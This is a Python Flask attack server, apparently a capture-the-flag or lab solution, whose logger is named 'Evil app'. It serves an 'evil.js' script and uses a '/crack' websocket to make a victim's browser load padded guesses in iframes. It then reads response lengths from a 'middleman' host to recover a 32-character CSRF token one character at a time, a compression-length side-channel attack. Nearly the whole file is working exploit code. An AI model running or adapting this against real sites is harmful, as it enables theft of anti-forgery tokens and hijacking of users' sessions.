import os
import flask
from simple_websocket import ws
import flask_sock
import logging
import requests
import queue
import typing

MIDDLEMAN_HOST = '172.31.217.234'
MIDDLEMAN_PORT = 7000

HEX_ALPHABET = '0123456789abcdef'
CSRF_LEN = 32

logger = logging.getLogger("Evil app")
logger.setLevel(logging.DEBUG)

fh = logging.FileHandler("middleman.log")
fh.setLevel(logging.DEBUG)
logger.addHandler(fh)

#sourced from: https://en.wikipedia.org/wiki/De_Bruijn_sequence
def de_bruijn(k: typing.Iterable[str], n: int) -> str:
    """de Bruijn sequence for alphabet k
    and subsequences of length n.
    """

    alphabet = k
    k = len(k)

    a = [0] * k * n
    sequence = []

    def db(t, p):
        if t > n:
            if n % p == 0:
                sequence.extend(a[1 : p + 1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)

    db(1, 1)
    return "".join(alphabet[i] for i in sequence)


class MiddlemanSession(requests.Session):
    _host: str
    _port: int

    def __init__(self, host: str, port: int, *args, **kwargs):
        self._host = host
        self._port = port
        super().__init__(*args,**kwargs)

    def clear_conversations(self):
        r = self.delete(f"http://{self._host}:{self._port}/conversations")
        if r.status_code // 100 != 2:
            logger.error(f"got error: {r.text}")
            r.raise_for_status()
        logger.debug("Cleared conversations successfully.")
    
    def get_page_len(self):
        r = self.get(f"http://{self._host}:{self._port}/conversations/page_len")
        if r.status_code != 200:
            logger.error(f"got error: {r.text}")
            r.raise_for_status()
        logger.debug(f"Got page size response {r.status_code}: {r.json()}")
        return r.json()['page_size']


files = [f.name for f in os.scandir(".") if not f.is_dir() and f.name[:-3] != '.py' and f.name[:-5] != '.json']
files = set(files)

app = flask.Flask(__name__,template_folder=os.getcwd())

sock = flask_sock.Sock(app)

padding = de_bruijn(['-','.',',','_','$','~'],3)

def gen_padded(st: str):
    global padding
    return st + padding, padding[:len(padding)//2] + st + padding[len(padding)//2:]


@app.route("/evil.js")
def serve_evil_js():
    return flask.send_file("evil.js")

@app.route("/")
def index():
    return flask.render_template("index.html")

@sock.route("/crack")
def crack(ws: ws.Server):
    try:
        data = ws.receive()
        if(data != "ready"):
            ws.close()
            return
        
        ping = requests.get(f"http://{MIDDLEMAN_HOST}:{MIDDLEMAN_PORT}/",timeout=3)
        if ping.status_code // 100 != 2:
            ping.raise_for_status()
        current_token = ''
        def get_len(token: str) -> int:
            with MiddlemanSession(MIDDLEMAN_HOST,MIDDLEMAN_PORT) as session:
                session.clear_conversations()
                ws.send(f"iframe\n{token}")
                if ws.receive() != 'page_loaded':
                    raise ValueError("client error")
                return session.get_page_len()
        def test_with_padding(ch: str) -> bool:
            with MiddlemanSession(MIDDLEMAN_HOST,MIDDLEMAN_PORT) as session:
                p1, p2 = gen_padded(ch)

                shorter = current_token + p1
                longer = current_token + p2
                
                session.clear_conversations()
                ws.send(f'iframe\n{shorter}')
                if ws.receive() != 'page_loaded':
                    raise ValueError("client error")
                l1 = session.get_page_len()

                session.clear_conversations()
                ws.send(f"iframe\n{longer}")
                if ws.receive() != 'page_loaded':
                    raise ValueError("client error")
                l2 = session.get_page_len()

                return l1 < l2
        
        token_candidates = queue.Queue()
        token_candidates.put_nowait('') #if multiple answers are found, prioritize ones where the size of the page does not increase when the character is appended.
        possible_tokens = []
        while not token_candidates.empty():
            current_token = token_candidates.get_nowait()
            if len(current_token) == CSRF_LEN:
                possible_tokens.append(current_token)
                continue

            for possible_byte in HEX_ALPHABET:
                if test_with_padding(possible_byte):
                    token_candidates.put_nowait(current_token + possible_byte)


        ws.send("done\ntoken extracted")
        ws.close_reason = "token extracted"
        ws.close()
    except Exception as e:
        ws.send(f"done\n{e}")
        ws.close_reason = str(e)
        ws.close()
        raise e

app.run("127.0.0.1",4000)